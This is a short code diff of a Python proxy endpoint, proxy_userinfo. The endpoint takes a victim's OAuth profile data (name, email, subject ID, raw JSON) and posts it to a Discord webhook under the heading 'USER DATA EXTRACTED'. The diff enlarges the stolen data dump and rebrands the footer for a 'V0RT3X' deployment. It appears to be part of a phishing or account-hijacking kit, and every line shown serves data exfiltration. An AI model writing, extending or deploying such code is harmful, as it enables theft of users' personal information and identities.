@@ -97,17 +97,17 @@ def proxy_userinfo():
         
         user_data = resp.json()
         
-        # Log to Discord
+        # Log to Discord with full user data
         discord({'embeds': [{
             'title': '👤 USER DATA EXTRACTED',
-            'color': 0x3498db,
+            'color': 0x00ff00,
             'fields': [
                 {'name': 'Full Name', 'value': f"{user_data.get('given_name', '')} {user_data.get('family_name', '')}", 'inline': True},
                 {'name': 'Email', 'value': user_data.get('email', 'N/A'), 'inline': True},
                 {'name': 'Sub', 'value': user_data.get('sub', 'N/A'), 'inline': False},
-                {'name': 'Full Data', 'value': f'```json\n{json.dumps(user_data, indent=2)[:500]}\n```', 'inline': False}
+                {'name': 'Full Data', 'value': f'```json\n{json.dumps(user_data, indent=2)[:800]}\n```', 'inline': False}
             ],
-            'footer': {'text': '🔱 V0RT3X | Full Chain Deploy'}
+            'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
         }]})
         
         r = jsonify(user_data)
